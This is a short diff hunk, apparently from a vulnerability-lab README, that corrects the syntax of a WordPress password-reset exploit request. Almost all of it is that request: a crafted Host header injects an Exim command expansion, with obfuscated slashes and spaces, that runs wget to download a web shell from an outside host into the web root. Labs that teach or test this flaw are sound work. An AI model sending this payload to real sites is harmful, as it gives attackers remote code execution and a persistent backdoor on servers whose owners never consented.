@@ -81,7 +81,7 @@ wp-submit=Get+New+Password&redirect_to=&user_login=admin
 
 ```
 POST /wp-login.php?action=lostpassword HTTP/1.1
-Host: target(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}wget${substr{10}{1}{$tod_log}}--output-document${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}var${substr{0}{1}{$spool_directory}}www${substr{0}{1}{$spool_directory}}html${substr{0}{1}{$spool_directory}}webshell.php${substr{10}{1}{$tod_log}}raw.githubusercontent.com${substr{0}{1}{$spool_directory}}medicean${substr{0}{1}{$spool_directory}}vulapps${substr{0}{1}{$spool_directory}}master${substr{0}{1}{$spool_directory}}w${substr{0}{1}{$spool_directory}}wordpress${substr{0}{1}{$spool_directory}}6${substr{0}{1}{$spool_directory}}webshell.php}} null) null)
+Host: target(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}wget${substr{10}{1}{$tod_log}}--output-document${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}var${substr{0}{1}{$spool_directory}}www${substr{0}{1}{$spool_directory}}html${substr{0}{1}{$spool_directory}}webshell.php${substr{10}{1}{$tod_log}}raw.githubusercontent.com${substr{0}{1}{$spool_directory}}medicean${substr{0}{1}{$spool_directory}}vulapps${substr{0}{1}{$spool_directory}}master${substr{0}{1}{$spool_directory}}w${substr{0}{1}{$spool_directory}}wordpress${substr{0}{1}{$spool_directory}}6${substr{0}{1}{$spool_directory}}webshell.php}} null)
 Connection: close
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:53.0) Gecko/20100101 Firefox/53.0
 Accept: */*
